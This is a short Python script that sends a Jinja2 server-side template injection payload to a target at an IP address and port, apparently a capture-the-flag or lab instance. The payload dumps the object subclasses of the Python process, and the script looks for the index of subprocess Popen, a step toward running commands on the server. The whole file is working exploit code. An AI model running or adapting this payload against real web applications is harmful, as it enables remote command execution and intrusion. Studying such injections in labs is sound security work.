import requests

#site url to hit
url = "http://178.128.40.63:30266/%7B%7B%20''.__class__.__mro__[1].__subclasses__()%20%7D%7D[414]"
req=requests.session()

#get request
response = req.get(url).content
response = str(response, 'utf-8')
response = response.split(',')
print(response)
for i, c in enumerate(response):
    if "Popen" in c:
        print(i)

